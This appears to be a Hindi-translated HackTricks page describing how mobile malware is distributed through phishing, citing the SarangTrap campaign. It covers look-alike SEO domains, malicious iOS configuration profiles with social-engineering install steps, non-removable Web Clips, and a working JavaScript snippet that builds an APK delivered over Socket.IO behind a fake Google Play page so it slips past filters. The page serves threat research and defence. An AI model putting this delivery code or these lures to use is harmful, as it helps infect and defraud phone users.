# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> यह पेज threat actors द्वारा phishing (SEO, social engineering, fake stores, dating apps आदि) के माध्यम से **malicious Android APKs** और **iOS mobile-configuration profiles** वितरित करने के लिए उपयोग की जाने वाली techniques को कवर करता है।
> यह सामग्री Zimperium zLabs द्वारा उजागर किए गए SarangTrap campaign (2025) और अन्य public research से ली गई है।<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* कई look-alike domains (dating, cloud share, car service आदि) register करें।
– Google में rank करने के लिए `<title>` element में local language keywords और emojis का उपयोग करें।
– उसी landing page पर Android (`.apk`) और iOS install instructions दोनों host करें।
2. **First Stage Download**
* Android: किसी *unsigned* या “third-party store” APK का direct link।
* iOS: किसी malicious **mobileconfig** profile का `itms-services://` या सामान्य HTTPS link (नीचे देखें)।
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection और अन्य post-install malware behaviour को नीचे दिए गए dedicated Android Malware Post-Exploitation page में कवर किया गया है।
4. **iOS Delivery Technique**
* एक single **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि का अनुरोध करके device को “MDM”-like supervision में enroll कर सकता है।
* Social-engineering instructions:
1. Settings ➜ *Profile downloaded* खोलें।
2. *Install* को तीन बार tap करें (phishing page पर screenshots)।
3. Unsigned profile पर trust करें ➜ attacker को App Store review के बिना *Contacts* और *Photo* entitlement मिल जाता है।
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads branded icon/label के साथ **phishing URL को Home Screen पर pin** कर सकते हैं।
* Web Clips **full-screen** में run हो सकते हैं (browser UI छिपा देते हैं) और उन्हें **non-removable** के रूप में mark किया जा सकता है, जिससे icon हटाने के लिए victim को profile delete करना पड़ता है।<sup>[[3]](#references)</sup>
6. **Network Layer**
* सामान्य HTTP, अक्सर port 80 पर HOST header जैसे `api.<phishingdomain>.com` के साथ।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS नहीं होने के कारण आसानी से पहचाना जा सकता है)।

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS और persistence जैसी post-install Android malware tradecraft के लिए नीचे दिए गए page को देखें:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers static APK links की जगह increasingly Google Play जैसे दिखने वाले lures में embedded Socket.IO/WebSocket channel का उपयोग कर रहे हैं। इससे payload URL छिप जाता है, URL/extension filters bypass हो जाते हैं और realistic install UX बना रहता है।<sup>[[2]](#references)[[4]](#references)</sup>

Wild में observed typical client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

यह सरल controls से क्यों बच निकलता है:
- कोई static APK URL expose नहीं होता; payload को WebSocket frames से memory में फिर से बनाया जाता है।
- Direct .apk responses को block करने वाले URL/MIME/extension filters, WebSockets/Socket.IO के जरिए tunneled binary data को miss कर सकते हैं।
- ऐसे Crawlers और URL sandboxes जो WebSockets execute नहीं करते, payload retrieve नहीं कर पाएंगे।

WebSocket tradecraft और tooling भी देखें:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romance का Dark Side: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple devices के लिए Web Clips payload settings](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Indonesian और Vietnamese Android Users को Target करने वाला Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
